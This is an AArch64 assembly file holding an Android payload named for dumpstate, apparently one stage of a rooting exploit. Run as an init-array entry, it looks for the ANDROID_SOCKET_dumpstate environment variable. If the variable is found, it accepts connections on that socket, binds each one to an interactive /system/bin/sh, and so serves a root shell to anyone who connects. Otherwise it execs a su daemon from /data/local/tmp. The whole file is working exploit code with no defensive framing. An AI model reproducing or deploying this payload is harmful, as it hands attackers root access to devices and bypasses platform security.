	.section .rodata.pd2241_dumpstate_payload,"a",@progbits
	.p2align 2
	.global pd2241_dumpstate_payload_start
	.global pd2241_dumpstate_payload_end
pd2241_dumpstate_payload_start:
	/* Bionic invokes init-array entries as (argc, argv, envp). */
	bti c
	mov x23, x2
	mov x19, x2
	adr x22, 8f
	cbz x19, 4f
1:
	ldr x0, [x19], #8
	cbz x0, 4f
	mov x1, x0
	mov x3, x22
2:
	ldrb w4, [x3], #1
	cbz w4, 3f
	ldrb w5, [x1], #1
	cmp w4, w5
	b.ne 1b
	b 2b
3:
	mov w20, wzr
5:
	ldrb w4, [x1], #1
	sub w4, w4, #'0'
	cmp w4, #9
	b.hi 6f
	mov w5, #10
	madd w20, w20, w5, w4
	b 5b

4:
	/* bugreportd has no inherited dumpstate socket: become the su daemon. */
	adr x0, 12f
	adr x3, 13f
	adr x4, 14f
	sub sp, sp, #32
	stp x3, x4, [sp]
	stp xzr, xzr, [sp, #16]
	mov x1, sp
	mov x2, x23
	mov x8, #221
	svc #0
	mov x0, #126
	mov x8, #93
	svc #0

	/* dumpstatez: serve a root shell on init's labelled dumpstate socket. */
6:
	mov x0, x20
	mov x1, #8
	mov x8, #201
	svc #0
15:
	mov x0, x20
	mov x1, xzr
	mov x2, xzr
	mov x3, xzr
	mov x8, #242
	svc #0
	cmp x0, #0
	b.lt 15b
	mov x21, x0
	mov x0, #17
	mov x1, xzr
	mov x2, xzr
	mov x3, xzr
	mov x4, xzr
	mov x8, #220
	svc #0
	cbz x0, 7f
	mov x0, x21
	mov x8, #57
	svc #0
	b 15b
7:
	mov x0, x20
	mov x8, #57
	svc #0
	mov x0, x21
	mov x1, #0
	mov x2, #0
	mov x8, #24
	svc #0
	mov x0, x21
	mov x1, #1
	mov x2, #0
	mov x8, #24
	svc #0
	mov x0, x21
	mov x1, #2
	mov x2, #0
	mov x8, #24
	svc #0
	adr x0, 9f
	adr x3, 10f
	adr x4, 11f
	sub sp, sp, #32
	stp x3, x4, [sp]
	stp xzr, xzr, [sp, #16]
	mov x1, sp
	mov x2, x23
	mov x8, #221
	svc #0
	mov x0, #127
	mov x8, #93
	svc #0

8:	.asciz "ANDROID_SOCKET_dumpstate="
9:	.asciz "/system/bin/sh"
10:	.asciz "sh"
11:	.asciz "-i"
12:	.asciz "/data/local/tmp/su"
13:	.asciz "su"
14:	.asciz "--daemon"
	.p2align 2
pd2241_dumpstate_payload_end:

	.section .note.GNU-stack,"",@progbits
